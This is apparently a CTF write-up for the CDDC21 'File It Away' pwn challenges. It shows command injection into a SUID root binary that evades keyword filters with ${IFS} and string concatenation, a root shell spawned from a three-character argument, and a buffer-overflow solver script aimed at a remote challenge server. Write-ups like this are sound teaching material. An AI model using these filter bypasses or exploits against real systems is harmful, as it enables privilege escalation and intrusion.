# File It Away \(Pwn\)

## Inject it Now

There is a `gdc_exec` binary on the server. It has SUID permissions and runs as root.

We can use the `tail` command to read the `gdc_exec.c` source code. Essentially, it runs `system(argv[1])` with a few restrictions:

1. `strstr()` checks for the substrings `sh`, `cat`, `flag` and `tmp` .
2. Argument to `gdc_exec` cannot have spaces.
3. Command will be run from the directory `/tmp`.
4. The `PATH` is set to an invalid directory.

The `${IFS}` value evaluates to a space character by default. Hence, `${IFS}` can be used to replace spaces in the argument.

You can use `export` to change the PATH back to `/bin`.

```text
/gdc_exec "export\${IFS}PATH='/bin'\${IFS}&&export"
export HOME='/root'
export HOSTNAME='a036d9204996'
export PATH='/bin'
export PWD='/'
export REMOTE_HOST='115.66.195.39'
```

Final payload, using string concatenation to bypass the `strstr()` check.

```text
/gdc_exec "export\${IFS}PATH='/bin'\${IFS}&&cmd=\"tail\${IFS}fl\"&&cmd2=\"ag\"&&cmd3=\"\$cmd\$cmd2\"&&\$cmd3"
CDDC21{You_Wi11_n3ver_st0p_u$}
```

## Length Matters

This is the same challenge, except `gdc_exec` now uses `strncpy()` to copy only the first 3 characters of `argv[1]` to the command to be executed. We could simply use `sh` to spawn a shell, then `cat` the flag from the elevated shell.

```text
/gdc_exec sh
cat flag
CDDC21{0nly_thr33_ch@rs??}
```

## Change Direction

This is a classic buffer overflow challenge, with a win function at `flag`.

```text
[0x08048400]> afl
0x08048400    1 33           entry0
0x080483f0    1 6            sym.imp.__libc_start_main
0x08048440    4 42           sym.deregister_tm_clones
0x08048470    4 55           sym.register_tm_clones
0x080484b0    3 30           sym.__do_global_dtors_aux
0x080484d0    4 45   -> 44   entry.init0
0x080485e0    1 2            sym.__libc_csu_fini
0x08048430    1 4            sym.__x86.get_pc_thunk.bx
0x080485e4    1 20           sym._fini
0x0804851b    1 20           sym.notaflag
0x080483c0    1 6            sym.imp.system
0x08048570    4 97           sym.__libc_csu_init
0x0804852f    1 64           main
0x080483a0    1 6            sym.imp.printf
0x080483b0    1 6            sym.imp.fflush
0x08048390    1 6            sym.imp.read
0x080484fd    1 30           sym.flag
0x080483e0    1 6            sym.imp.exit
0x08048358    3 35           sym._init
0x080483d0    1 6            loc.imp.__gmon_start__
[0x08048400]>
```

The win function is at 0x080484fd.

Using the `msf-pattern_create` cyclic payload, we can overflow the buffer and inspect the EIP value after the binary crashes.

```text
gef➤  info frame
Stack level 0, frame at 0xffffd1a4:
 eip = 0x63413563; saved eip = 0x37634136
 called by frame at 0xffffd1a8
 Arglist at 0xffffd19c, args: 
 Locals at 0xffffd19c, Previous frame's sp is 0xffffd1a4
 Saved registers:
  eip at 0xffffd1a0
```

Looks like the offset to overwrite the EIP is 76.

```bash
└─$ msf-pattern_offset -q 0x37634136
[*] Exact match at offset 80

└─$ msf-pattern_offset -q 0x63413563
[*] Exact match at offset 76
```

Using a solver script, we can then send the payload to the remote server and obtain the flag. 

```python
from pwn import *

ret = 0x080484fd
offset = 76
payload = b""
payload += b"A" * offset
payload += p64(ret)
print(payload)

with open('payload', 'wb') as f:
    f.write(payload)

conn = remote('13.213.195.207', 60130)

print(conn.recv())
conn.send(payload + b"\n")
print(conn.recv())

conn.close()
```

